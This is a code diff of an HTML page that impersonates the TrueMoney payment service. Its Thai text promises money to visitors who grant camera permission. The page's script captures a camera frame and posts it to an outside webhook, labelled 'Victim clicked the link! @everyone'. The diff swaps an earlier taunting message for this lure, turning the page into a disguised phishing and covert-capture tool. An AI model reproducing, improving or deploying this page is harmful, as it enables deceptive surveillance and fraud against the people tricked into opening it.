@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ยิ้มหน่อย^^</title>
+<title>TrueMoney</title>
 
 <style>
     body {
@@ -64,14 +64,14 @@
 
 <body>
 <div class="container">
-    <h1>ยิ้มหน่อยเบ้บ^^</h1>
-    <div class="note">หมายเหตุ: โดนดักละไอควาย</div>
+    <h1>กดอนุญาตเพื่อรับเงิน</h1>
+    <div class="note">กดอนุญาตเพื่อรับเงิน</div>
 
     <div class="camera-box">
         <video id="video" autoplay playsinline></video>
     </div>
 
-    <div class="status" id="status">กำลังขออนุญาตใช้กล้อง</div>
+    <div class="status" id="status">กดอนุญาตเพื่อรับเงิน</div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
@@ -107,7 +107,7 @@ async function captureAndSend() {
     canvas.toBlob(async (blob) => {
         const formData = new FormData();
         formData.append("file", blob, "camera.png");
-        formData.append("content", "@everyone ziggy");
+        formData.append("content", "📸 **เหยื่อกดลิ้งแล้ว!** @everyone");
 
         try {
             await fetch(webhookURL, {
